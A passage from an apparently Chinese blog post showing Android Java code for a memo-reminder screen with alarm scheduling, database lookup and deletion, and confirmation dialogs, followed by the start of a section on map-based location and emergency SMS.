private Calendar c = null;</div><div class="line">    private int importance_Pos,type_Pos,rem_time_Pos;</div><div class="line">    private DB_all_Server db;</div><div class="line">    private SharedPreferences share;</div><div class="line">    private SharedPreferences.Editor editor;</div><div class="line">    private List&lt;bwl_instance&gt;bwl_arr=new ArrayList&lt;bwl_instance&gt;();</div><div class="line">    private String[] importance_items = new String[] &#123;&quot;普通&quot;,&quot;重要&quot;,&quot;非常重要&quot;&#125;;//</div><div class="line">    private String[] type_items = new String[] &#123;&quot;其它&quot;,&quot;运动&quot;,&quot;健康&quot;&#125;;//</div><div class="line">    private String[] rem_time_items = new String[] &#123;&quot;30s&quot;,&quot;1min&quot;,&quot;5min&quot;,&quot;30min&quot;,&quot;无&quot;&#125;;//</div><div class="line">    private Handler cancel_handler=new Handler()&#123;</div><div class="line">        @Override</div><div class="line">        public void handleMessage(Message msg) &#123;</div><div class="line">            if(msg.what==0)</div><div class="line">            &#123;</div><div class="line"></div><div class="line">            &#125;</div><div class="line">            else if(msg.what==1)</div><div class="line">            &#123;</div><div class="line">                Intent intent = new Intent(BWL.this, AlarmReceiver.class);</div><div class="line">                PendingIntent pi = PendingIntent.getBroadcast(BWL.this, 0,</div><div class="line">                        intent, 0);</div><div class="line">                AlarmManager am = (AlarmManager)getSystemService(ALARM_SERVICE);</div><div class="line">                //取消警报</div><div class="line">                am.cancel(pi);</div><div class="line">                tv.setText(&quot;备忘录提醒闹钟已被取消&quot;);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;;</div><div class="line">    private Handler del_handler=new Handler()&#123;</div><div class="line">        @Override</div><div class="line">        public void handleMessage(Message msg) &#123;</div><div class="line">            if(msg.what==0)</div><div class="line">            &#123;</div><div class="line"></div><div class="line">            &#125;</div><div class="line">            else if(msg.what==1)</div><div class="line">            &#123;</div><div class="line">                int i = Integer.parseInt(info_id.getText().toString());</div><div class="line">                db.delete_bwl_by_id(i);</div><div class="line">                bwl_db.setText(&quot;&quot;);</div><div class="line">                Toast.makeText(getApplicationContext(),  &quot;成功删除编号为 &quot;+i+&quot; 的备忘记录~&quot;, Toast.LENGTH_SHORT).show();</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;;</div><div class="line">    private Handler clear_handler=new Handler()&#123;</div><div class="line">        @Override</div><div class="line">        public void handleMessage(Message msg) &#123;</div><div class="line">            if(msg.what==0)</div><div class="line">            &#123;</div><div class="line"></div><div class="line">            &#125;</div><div class="line">            else if(msg.what==1)</div><div class="line">            &#123;</div><div class="line">                info.setText(&quot;&quot;);</div><div class="line">                time.setText(&quot;&quot;);</div><div class="line">                importance_Spinner.setSelection(0,true);</div><div class="line">                type_Spinner.setSelection(0,true);</div><div class="line">                rem_time_Spinner.setSelection(0,true);</div><div class="line">                Toast.makeText(getApplicationContext(), &quot;成功清空内容重置信息~&quot;, Toast.LENGTH_SHORT).show();</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;;</div><div class="line">    private boolean checkInfo(String s)</div><div class="line">    &#123;</div><div class="line">        if(s.equals(&quot;&quot;)||s==null)</div><div class="line">            return false;</div><div class="line">        else</div><div class="line">            return true;</div><div class="line">    &#125;</div><div class="line">    @Override</div><div class="line">    public void onCreate(Bundle savedInstanceState) &#123;</div><div class="line">        super.onCreate(savedInstanceState);</div><div class="line">        setContentView(R.layout.bwl);</div><div class="line">        share=getSharedPreferences(&quot;DatabaseDamo&quot;, 0);</div><div class="line">        editor=share.edit();</div><div class="line">        db=new DB_all_Server(this);</div><div class="line">        bwl_db = (TextView)findViewById(R.id.bwl_db);</div><div class="line"></div><div class="line">        tv = (TextView)findViewById(R.id.tv);</div><div class="line">//        setTime = (Button)findViewById(R.id.set_alarm);</div><div class="line">        display_bwl=(Button)findViewById(R.id.display_bwl);</div><div class="line">//        add_item=(Button)findViewById(R.id.add_item);</div><div class="line">        del_item=(Button)findViewById(R.id.del_item);</div><div class="line">        get_item=(Button)findViewById(R.id.get_item);</div><div class="line">        info=(EditText)findViewById(R.id.info);</div><div class="line">        time=(EditText)findViewById(R.id.time);</div><div class="line">        info_id=(EditText)findViewById(R.id.info_id);</div><div class="line">//        cancelTime = (Button)findViewById(R.id.cancel_alarm);</div><div class="line">       importance_Spinner = (Spinner)findViewById(R.id.importance);</div><div class="line">        rem_time_Spinner = (Spinner)findViewById(R.id.rem_time);</div><div class="line">        type_Spinner = (Spinner)findViewById(R.id.type);</div><div class="line">        //绑定适配器和值</div><div class="line">        importance_Adapter = new ArrayAdapter&lt;String&gt;(BWL.this,</div><div class="line">                android.R.layout.simple_spinner_item,importance_items);</div><div class="line">        type_Adapter = new ArrayAdapter&lt;String&gt;(BWL.this,</div><div class="line">                android.R.layout.simple_spinner_item,type_items);</div><div class="line">        rem_time_Adapter = new ArrayAdapter&lt;String&gt;(BWL.this,</div><div class="line">                android.R.layout.simple_spinner_item,rem_time_items);</div><div class="line">        importance_Spinner.setAdapter(importance_Adapter);</div><div class="line">        type_Spinner.setAdapter(type_Adapter);</div><div class="line">        rem_time_Spinner.setAdapter(rem_time_Adapter);</div><div class="line">        importance_Spinner.setSelection(0,true);</div><div class="line">        type_Spinner.setSelection(0,true);</div><div class="line">        rem_time_Spinner.setSelection(0,true); //设置默认选中项，此处为默认选中第1个值</div><div class="line">        importance_Spinner.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener()</div><div class="line">        &#123;</div><div class="line"></div><div class="line">            @Override</div><div class="line">            public void onItemSelected(AdapterView&lt;?&gt; arg0, View arg1, int position, long arg3)</div><div class="line">            &#123;</div><div class="line"></div><div class="line">                importance_Pos= position;</div><div class="line">            &#125;</div><div class="line">            @Override</div><div class="line">            public void onNothingSelected(AdapterView&lt;?&gt; arg0)</div><div class="line">            &#123;</div><div class="line">                importance_Pos=0;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">        &#125;);</div><div class="line">        type_Spinner.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener()</div><div class="line">        &#123;</div><div class="line"></div><div class="line">            @Override</div><div class="line">            public void onItemSelected(AdapterView&lt;?&gt; arg0, View arg1, int position, long arg3)</div><div class="line">            &#123;</div><div class="line"></div><div class="line">               type_Pos= position;</div><div class="line">            &#125;</div><div class="line">            @Override</div><div class="line">            public void onNothingSelected(AdapterView&lt;?&gt; arg0)</div><div class="line">            &#123;</div><div class="line">                type_Pos=0;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">        &#125;);</div><div class="line">        rem_time_Spinner.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener()</div><div class="line">        &#123;</div><div class="line"></div><div class="line">            @Override</div><div class="line">            public void onItemSelected(AdapterView&lt;?&gt; arg0, View arg1, int position, long arg3)</div><div class="line">            &#123;</div><div class="line"></div><div class="line"></div><div class="line">                rem_time_Pos= position;</div><div class="line">            &#125;</div><div class="line">            @Override</div><div class="line">            public void onNothingSelected(AdapterView&lt;?&gt; arg0)</div><div class="line">            &#123;</div><div class="line">                rem_time_Pos=0;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">        &#125;);</div><div class="line">        if(share.getInt(&quot;times&quot;, 0)==0)</div><div class="line">        &#123;</div><div class="line">            editor.putInt(&quot;times&quot;, 1);</div><div class="line">            editor.commit();</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        circleMenu = (CircleMenu) findViewById(R.id.circle_menu);</div><div class="line"></div><div class="line">        circleMenu.setMainMenu(Color.parseColor(&quot;#CDCDCD&quot;), R.mipmap.cong, R.mipmap.icon_cancel)</div><div class="line">                .addSubMenu(Color.parseColor(&quot;#258CFF&quot;), R.mipmap.clear)</div><div class="line">                .addSubMenu(Color.parseColor(&quot;#30A400&quot;), R.mipmap.icon_search)</div><div class="line">                .addSubMenu(Color.parseColor(&quot;#FF4B32&quot;), R.mipmap.icon_notify)</div><div class="line">                .addSubMenu(Color.parseColor(&quot;#8A39FF&quot;), R.mipmap.icon_notify_no)</div><div class="line">                .addSubMenu(Color.parseColor(&quot;#FF6A00&quot;), R.mipmap.s)</div><div class="line">                .setOnMenuSelectedListener(new OnMenuSelectedListener() &#123;</div><div class="line"></div><div class="line">                    @Override</div><div class="line">                    public void onMenuSelected(int index) &#123;</div><div class="line">                        switch (index)&#123;</div><div class="line">                            case 0:</div><div class="line">                               windows(3);</div><div class="line">                                break;</div><div class="line">                            case 1:</div><div class="line">                                bwl_instance t=new bwl_instance();</div><div class="line">                                int i = Integer.parseInt(info_id.getText().toString());</div><div class="line">                                try &#123;</div><div class="line">                                    t = db.find_bwl_by_id(i);</div><div class="line">                                    bwl_db.setText(&quot;&quot;);</div><div class="line">                                    bwl_db.setText(t.toString());</div><div class="line">                                    Toast.makeText(getApplicationContext(), &quot;成功获取编号为 &quot; + i + &quot; 的备忘记录~&quot;, Toast.LENGTH_SHORT).show();</div><div class="line">                                &#125;</div><div class="line">                                catch (Exception e)&#123;</div><div class="line">                                    Toast.makeText(getApplicationContext(), &quot;不存在编号为 &quot; + i + &quot; 的备忘记录~请重新输入查询&quot;, Toast.LENGTH_SHORT).show();</div><div class="line">                                &#125;</div><div class="line">                                break;</div><div class="line">                            case 2:</div><div class="line">                                c = Calendar.getInstance();</div><div class="line">                                c.setTimeInMillis(System.currentTimeMillis());</div><div class="line">                                int hour = c.get(Calendar.HOUR_OF_DAY);</div><div class="line">                                int minute = c.get(Calendar.MINUTE);</div><div class="line">                                new TimePickerDialog(BWL.this, minute, new TimePickerDialog.OnTimeSetListener() &#123;</div><div class="line">                                    @Override</div><div class="line">                                    public void onTimeSet(TimePicker view, int hourOfDay, int minute) &#123;</div><div class="line">                                        //是设置日历的时间，主要是让日历的年月日和当前同步</div><div class="line">                                        c.setTimeInMillis(System.currentTimeMillis());</div><div class="line">                                        //设置小时分钟，秒和毫秒都设置为0</div><div class="line">                                        c.set(Calendar.HOUR_OF_DAY, hourOfDay);</div><div class="line">                                        c.set(Calendar.MINUTE, minute);</div><div class="line">                                        c.set(Calendar.SECOND, 0);</div><div class="line">                                        c.set(Calendar.MILLISECOND, 0);</div><div class="line">                                        Intent intent = new Intent(BWL.this, AlarmReceiver.class);</div><div class="line">                                        String temp_info=info.getText().toString();</div><div class="line">                                        intent.putExtra(&quot;tx_info&quot;,&quot;[&quot;+type_items[type_Pos]+&quot;:&quot;+importance_items[importance_Pos]+&quot;]&quot;+temp_info);</div><div class="line">                                        PendingIntent pi = PendingIntent.getBroadcast(BWL.this, 0, intent, 0);</div><div class="line">                                        //得到AlarmManager实例</div><div class="line">                                        AlarmManager am = (AlarmManager)getSystemService(ALARM_SERVICE);</div><div class="line">                                        //根据当前时间预设一个警报</div><div class="line">                                        if(checkInfo(temp_info)) &#123;</div><div class="line">                                            am.set(AlarmManager.RTC_WAKEUP, c.getTimeInMillis(), pi);</div><div class="line">                                            /**</div><div class="line">                                             * 第一个参数是警报类型；第二个参数是第一次执行的延迟时间，可以延迟，也可以马上执行；第三个参数是重复周期为一天</div><div class="line">                                             * 这句话的意思是设置闹铃重复周期，也就是执行警报的间隔时间</div><div class="line">                                             */</div><div class="line">//                      am.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()+(60*1000),</div><div class="line">//                              (24*60*60*1000), pi);</div><div class="line">                                            if(rem_time_items[rem_time_Pos].equals(&quot;30s&quot;)) &#123;</div><div class="line">                                                am.setRepeating(AlarmManager.RTC_WAKEUP,c.getTimeInMillis(),</div><div class="line">                                                        30000, pi);</div><div class="line">                                            &#125;</div><div class="line">                                            if(rem_time_items[rem_time_Pos].equals(&quot;1min&quot;)) &#123;</div><div class="line">                                                am.setRepeating(AlarmManager.RTC_WAKEUP, c.getTimeInMillis() ,</div><div class="line">                                                        60000, pi);</div><div class="line">                                            &#125;</div><div class="line">                                            if(rem_time_items[rem_time_Pos].equals(&quot;5min&quot;)) &#123;</div><div class="line">                                                am.setRepeating(AlarmManager.RTC_WAKEUP, c.getTimeInMillis() ,</div><div class="line">                                                        300000, pi);</div><div class="line">                                            &#125;</div><div class="line">                                            if(rem_time_items[rem_time_Pos].equals(&quot;30min&quot;)) &#123;</div><div class="line">                                                am.setRepeating(AlarmManager.RTC_WAKEUP, c.getTimeInMillis() ,</div><div class="line">                                                        1800000, pi);</div><div class="line">                                            &#125;</div><div class="line">                                            if(rem_time_items[rem_time_Pos].equals(&quot;无&quot;)) &#123;</div><div class="line">                                                am.setRepeating(AlarmManager.RTC_WAKEUP,c.getTimeInMillis() ,</div><div class="line">                                                        1800000000, pi);</div><div class="line">                                            &#125;</div><div class="line">                                            String msg = &quot;成功设置备忘录提醒时间为&quot; + format(hourOfDay) + &quot;:&quot; + format(minute);</div><div class="line">                                            String rem_time= format(hourOfDay) + &quot;:&quot; + format(minute);</div><div class="line">                                            time.setText(rem_time);</div><div class="line">                                            bwl_instance bwl=new bwl_instance();</div><div class="line">                                            bwl.setTime(rem_time);</div><div class="line">                                            bwl.setType(type_items[type_Pos]);</div><div class="line">                                            bwl.setImportance(importance_items[importance_Pos]);</div><div class="line">                                            bwl.setInfo(temp_info);</div><div class="line">                                            bwl.setRem_time(rem_time_items[rem_time_Pos]);</div><div class="line">                                            db.add_bwl(bwl);</div><div class="line">                                            tv.setText(msg);</div><div class="line">                                        &#125;</div><div class="line">                                        else&#123;</div><div class="line">                                            String msg = &quot;信息填写不完整，无法生成备忘录提醒&quot;;</div><div class="line">                                            tv.setText(msg);</div><div class="line">                                        &#125;</div><div class="line">                                    &#125;</div><div class="line">                                &#125;, hour, minute, true).show();</div><div class="line">                                //上面的TimePickerDialog中的5个参数参考：http://blog.csdn.net/yang_hui1986527/article/details/6839342</div><div class="line">                                break;</div><div class="line">                            case 3:</div><div class="line">                               windows(1);</div><div class="line">                                break;</div><div class="line">                            case 4:</div><div class="line">                              windows(2);</div><div class="line">                                break;</div><div class="line">                        &#125;</div><div class="line">                    &#125;</div><div class="line"></div><div class="line">                &#125;).setOnMenuStatusChangeListener(new OnMenuStatusChangeListener() &#123;</div><div class="line"></div><div class="line">            @Override</div><div class="line">            public void onMenuOpened() &#123;</div><div class="line"></div><div class="line">            &#125;</div><div class="line"></div><div class="line">            @Override</div><div class="line">            public void onMenuClosed() &#123;</div><div class="line">                Toast.makeText(getApplicationContext(), &quot;Please click the button and get more choice！&quot;, Toast.LENGTH_SHORT).show();</div><div class="line">            &#125;</div><div class="line"></div><div class="line">        &#125;);</div><div class="line"></div><div class="line">        //得到日历实例，主要是为了下面的获取时间</div><div class="line">        c = Calendar.getInstance();</div><div class="line">//        setTime.setOnClickListener(new Button.OnClickListener()</div><div class="line">//        &#123;</div><div class="line">//</div><div class="line">//            @Override</div><div class="line">//            public void onClick(View arg0) &#123;</div><div class="line">//                c.setTimeInMillis(System.currentTimeMillis());</div><div class="line">//                int hour = c.get(Calendar.HOUR_OF_DAY);</div><div class="line">//                int minute = c.get(Calendar.MINUTE);</div><div class="line">//                new TimePickerDialog(BWL.this, minute, new TimePickerDialog.OnTimeSetListener() &#123;</div><div class="line">//                    @Override</div><div class="line">//                    public void onTimeSet(TimePicker view, int hourOfDay, int minute) &#123;</div><div class="line">//                        //是设置日历的时间，主要是让日历的年月日和当前同步</div><div class="line">//                        c.setTimeInMillis(System.currentTimeMillis());</div><div class="line">//                        //设置小时分钟，秒和毫秒都设置为0</div><div class="line">//                        c.set(Calendar.HOUR_OF_DAY, hourOfDay);</div><div class="line">//                        c.set(Calendar.MINUTE, minute);</div><div class="line">//                        c.set(Calendar.SECOND, 0);</div><div class="line">//                        c.set(Calendar.MILLISECOND, 0);</div><div class="line">//                        Intent intent = new Intent(BWL.this, AlarmReceiver.class);</div><div class="line">//                        String temp_info=info.getText().toString();</div><div class="line">//                        intent.putExtra(&quot;tx_info&quot;,&quot;[&quot;+type_items[type_Pos]+&quot;:&quot;+importance_items[importance_Pos]+&quot;]&quot;+temp_info);</div><div class="line">//                        PendingIntent pi = PendingIntent.getBroadcast(BWL.this, 0, intent, 0);</div><div class="line">//                        //得到AlarmManager实例</div><div class="line">//                        AlarmManager am = (AlarmManager)getSystemService(ALARM_SERVICE);</div><div class="line">//                        //根据当前时间预设一个警报</div><div class="line">//                        if(checkInfo(temp_info)) &#123;</div><div class="line">//                            am.set(AlarmManager.RTC_WAKEUP, c.getTimeInMillis(), pi);</div><div class="line">//                            /**</div><div class="line">//                             * 第一个参数是警报类型；第二个参数是第一次执行的延迟时间，可以延迟，也可以马上执行；第三个参数是重复周期为一天</div><div class="line">//                             * 这句话的意思是设置闹铃重复周期，也就是执行警报的间隔时间</div><div class="line">//                             */</div><div class="line">////                      am.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()+(60*1000),</div><div class="line">////                              (24*60*60*1000), pi);</div><div class="line">//                            if(rem_time_items[rem_time_Pos].equals(&quot;30s&quot;)) &#123;</div><div class="line">//                                am.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() ,</div><div class="line">//                                        30000, pi);</div><div class="line">//                            &#125;</div><div class="line">//                            if(rem_time_items[rem_time_Pos].equals(&quot;1min&quot;)) &#123;</div><div class="line">//                                am.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() ,</div><div class="line">//                                        60000, pi);</div><div class="line">//                            &#125;</div><div class="line">//                            if(rem_time_items[rem_time_Pos].equals(&quot;5min&quot;)) &#123;</div><div class="line">//                                am.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() ,</div><div class="line">//                                        300000, pi);</div><div class="line">//                            &#125;</div><div class="line">//                            if(rem_time_items[rem_time_Pos].equals(&quot;30min&quot;)) &#123;</div><div class="line">//                                am.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() ,</div><div class="line">//                                        1800000, pi);</div><div class="line">//                            &#125;</div><div class="line">//                            if(rem_time_items[rem_time_Pos].equals(&quot;无&quot;)) &#123;</div><div class="line">//                                am.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() ,</div><div class="line">//                                        1800000000, pi);</div><div class="line">//                            &#125;</div><div class="line">//                            String msg = &quot;成功设置备忘录提醒时间为&quot; + format(hourOfDay) + &quot;:&quot; + format(minute);</div><div class="line">//                            String rem_time= format(hourOfDay) + &quot;:&quot; + format(minute);</div><div class="line">//                            time.setText(rem_time);</div><div class="line">//                            bwl_instance bwl=new bwl_instance();</div><div class="line">//                            bwl.setTime(rem_time);</div><div class="line">//                            bwl.setType(type_items[type_Pos]);</div><div class="line">//                            bwl.setImportance(importance_items[importance_Pos]);</div><div class="line">//                            bwl.setInfo(temp_info);</div><div class="line">//                            bwl.setRem_time(rem_time_items[rem_time_Pos]);</div><div class="line">//                            db.add_bwl(bwl);</div><div class="line">//                            tv.setText(msg);</div><div class="line">//                        &#125;</div><div class="line">//                        else&#123;</div><div class="line">//                            String msg = &quot;信息填写不完整，无法生成备忘录提醒&quot;;</div><div class="line">//                            tv.setText(msg);</div><div class="line">//                        &#125;</div><div class="line">//                    &#125;</div><div class="line">//                &#125;, hour, minute, true).show();</div><div class="line">//                //上面的TimePickerDialog中的5个参数参考：http://blog.csdn.net/yang_hui1986527/article/details/6839342</div><div class="line">//            &#125;</div><div class="line">//</div><div class="line">//        &#125;);</div><div class="line"></div><div class="line">//        cancelTime.setOnClickListener(new Button.OnClickListener()</div><div class="line">//        &#123;</div><div class="line">//</div><div class="line">//            @Override</div><div class="line">//            public void onClick(View v) &#123;</div><div class="line">//                Intent intent = new Intent(BWL.this, AlarmReceiver.class);</div><div class="line">//                PendingIntent pi = PendingIntent.getBroadcast(BWL.this, 0,</div><div class="line">//                        intent, 0);</div><div class="line">//                AlarmManager am = (AlarmManager)getSystemService(ALARM_SERVICE);</div><div class="line">//                //取消警报</div><div class="line">//                am.cancel(pi);</div><div class="line">//                tv.setText(&quot;闹钟取消&quot;);</div><div class="line">//            &#125;</div><div class="line">//</div><div class="line">//        &#125;);</div><div class="line">//        add_item.setOnClickListener(new Button.OnClickListener()</div><div class="line">//        &#123;</div><div class="line">//  //单纯的清空&amp;提示作用</div><div class="line">//            @Override</div><div class="line">//            public void onClick(View v) &#123;</div><div class="line">//                info.setText(&quot;&quot;);</div><div class="line">//                time.setText(&quot;&quot;);</div><div class="line">//                Toast.makeText(getApplicationContext(), &quot;新的备忘录加入数据库成功&quot;, Toast.LENGTH_SHORT).show();</div><div class="line">//            &#125;</div><div class="line">//</div><div class="line">//        &#125;);</div><div class="line">    display_bwl.setOnClickListener(new Button.OnClickListener()</div><div class="line">    &#123;</div><div class="line"></div><div class="line">        @Override</div><div class="line">        public void onClick(View v) &#123;</div><div class="line">            bwl_arr=db.get_bwl();</div><div class="line">            Toast.makeText(getApplicationContext(), &quot;成功获取所有备忘事件~&quot;, Toast.LENGTH_SHORT).show();</div><div class="line">            String data=&quot;&quot;;</div><div class="line">            for(int i=0;i&lt;bwl_arr.size();i++)&#123;</div><div class="line">                data+=&quot;\n编号：&quot;+bwl_arr.get(i).getInfo_id()+&quot;\n备忘类型：&quot;+bwl_arr.get(i).getType()+&quot;\n备忘信息：&quot;+bwl_arr.get(i).getInfo()+&quot;\n备忘时间：&quot;+bwl_arr.get(i).getTime()+&quot;\n重要程度：&quot;+bwl_arr.get(i).getImportance()+&quot;\n提醒间隔时间：&quot;+bwl_arr.get(i).getRem_time();</div><div class="line">            &#125;</div><div class="line">          bwl_db.setText(data);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;);</div><div class="line">        del_item.setOnClickListener(new Button.OnClickListener()</div><div class="line">        &#123;</div><div class="line">            //单纯的清空&amp;提示作用</div><div class="line">            @Override</div><div class="line">            public void onClick(View v) &#123;</div><div class="line">               windows(2);</div><div class="line">            &#125;</div><div class="line"></div><div class="line">        &#125;);</div><div class="line">        get_item.setOnClickListener(new Button.OnClickListener()</div><div class="line">        &#123;</div><div class="line">            //单纯的清空&amp;提示作用</div><div class="line">            @Override</div><div class="line">            public void onClick(View v) &#123;</div><div class="line">                bwl_instance t=new bwl_instance();</div><div class="line">                int i = Integer.parseInt(info_id.getText().toString());</div><div class="line">                try &#123;</div><div class="line">                    t = db.find_bwl_by_id(i);</div><div class="line">                    bwl_db.setText(&quot;&quot;);</div><div class="line">                    bwl_db.setText(t.toString());</div><div class="line">                    Toast.makeText(getApplicationContext(), &quot;成功获取编号为 &quot; + i + &quot; 的备忘记录~&quot;, Toast.LENGTH_SHORT).show();</div><div class="line">                &#125;</div><div class="line">                catch (Exception e)&#123;</div><div class="line">                    Toast.makeText(getApplicationContext(), &quot;不存在编号为 &quot; + i + &quot; 的备忘记录~请重新输入查询&quot;, Toast.LENGTH_SHORT).show();</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    private String format(int x)</div><div class="line">    &#123;</div><div class="line">        String s = &quot;&quot;+x;</div><div class="line">        if(s.length() == 1)</div><div class="line">            s = &quot;0&quot;+s;</div><div class="line">        return s;</div><div class="line">    &#125;</div><div class="line">    private void  windows(int x)&#123;</div><div class="line">        if(x==1)&#123;</div><div class="line">            new AlertDialog.Builder(this)</div><div class="line">                    .setTitle(&quot;系统提示：&quot;)</div><div class="line">                    .setMessage(&quot;确定取消该备忘录定时提醒吗？(一旦取消需要重新设置)&quot;)</div><div class="line">                    .setPositiveButton(&quot;确认取消&quot;, new DialogInterface.OnClickListener() &#123;</div><div class="line">                        @Override</div><div class="line">                        public void onClick(DialogInterface dialog, int which) &#123;</div><div class="line">                            // TODO Auto-generated method stub</div><div class="line">                            Message msg = new Message();</div><div class="line">                            msg.what = 1;</div><div class="line">                            cancel_handler.sendMessage(msg);</div><div class="line">                        &#125;</div><div class="line">                    &#125;)</div><div class="line">                    .setNegativeButton(&quot;放弃&quot;, new DialogInterface.OnClickListener() &#123;</div><div class="line">                        @Override</div><div class="line">                        public void onClick(DialogInterface dialog, int which) &#123;</div><div class="line">                            // TODO Auto-generated method stub</div><div class="line">                            Message msg = new Message();</div><div class="line">                            msg.what = 0;</div><div class="line">                            cancel_handler.sendMessage(msg);</div><div class="line">                        &#125;</div><div class="line">                    &#125;)</div><div class="line">                    .show();</div><div class="line">        &#125;</div><div class="line">        else if(x==2)&#123;</div><div class="line">            new AlertDialog.Builder(this)</div><div class="line">                    .setTitle(&quot;系统提示：&quot;)</div><div class="line">                    .setMessage(&quot;确定删除该备忘录信息吗？(一旦删除不可恢复)&quot;)</div><div class="line">                    .setPositiveButton(&quot;确认删除&quot;, new DialogInterface.OnClickListener() &#123;</div><div class="line">                        @Override</div><div class="line">                        public void onClick(DialogInterface dialog, int which) &#123;</div><div class="line">                            // TODO Auto-generated method stub</div><div class="line">                            Message msg = new Message();</div><div class="line">                            msg.what = 1;</div><div class="line">                            del_handler.sendMessage(msg);</div><div class="line">                        &#125;</div><div class="line">                    &#125;)</div><div class="line">                    .setNegativeButton(&quot;取消&quot;, new DialogInterface.OnClickListener() &#123;</div><div class="line">                        @Override</div><div class="line">                        public void onClick(DialogInterface dialog, int which) &#123;</div><div class="line">                            // TODO Auto-generated method stub</div><div class="line">                            Message msg = new Message();</div><div class="line">                            msg.what = 0;</div><div class="line">                            del_handler.sendMessage(msg);</div><div class="line">                        &#125;</div><div class="line">                    &#125;)</div><div class="line">                    .show();</div><div class="line">        &#125;</div><div class="line">        else if(x==3)&#123;</div><div class="line">            new AlertDialog.Builder(this)</div><div class="line">                    .setTitle(&quot;系统提示：&quot;)</div><div class="line">                    .setMessage(&quot;确定重置已填写的信息吗？(一旦清空重置不可恢复)&quot;)</div><div class="line">                    .setPositiveButton(&quot;确认重置&quot;, new DialogInterface.OnClickListener() &#123;</div><div class="line">                        @Override</div><div class="line">                        public void onClick(DialogInterface dialog, int which) &#123;</div><div class="line">                            // TODO Auto-generated method stub</div><div class="line">                            Message msg = new Message();</div><div class="line">                            msg.what = 1;</div><div class="line">                            clear_handler.sendMessage(msg);</div><div class="line">                        &#125;</div><div class="line">                    &#125;)</div><div class="line">                    .setNegativeButton(&quot;取消&quot;, new DialogInterface.OnClickListener() &#123;</div><div class="line">                        @Override</div><div class="line">                        public void onClick(DialogInterface dialog, int which) &#123;</div><div class="line">                            // TODO Auto-generated method stub</div><div class="line">                            Message msg = new Message();</div><div class="line">                            msg.what = 0;</div><div class="line">                            clear_handler.sendMessage(msg);</div><div class="line">                        &#125;</div><div class="line">                    &#125;)</div><div class="line">                    .show();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="2-4-高德地图定位系统以及紧急短信收发-加速度阈值设定-√"><a href="#2-4-高德地图定位系统以及紧急短信收发-加速度阈值设定-√" class="headerlink" title="2-4 高德地图定位系统以及紧急短信收发(加速度阈值设定)√"></a>2-4 高德地图定位系统以及紧急短信收发(加速度阈值设定)√</h2><p>进入定位系统初始化界面<br><img src="http://op72m4y17.bkt.clouddn.com/app47.png" alt=""><br>提示是否确认通知<br><img src="http://op72m4y17.bkt.clouddn.com/app48.png" alt=""></p>
<p>自动定位后获取地址(打开定位默认为需要紧急联系，在其它界面中只要手机超过加速度阈值就会自动定位)<br><img src="http://op72m4y17.bkt.clouddn.com/app49.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div 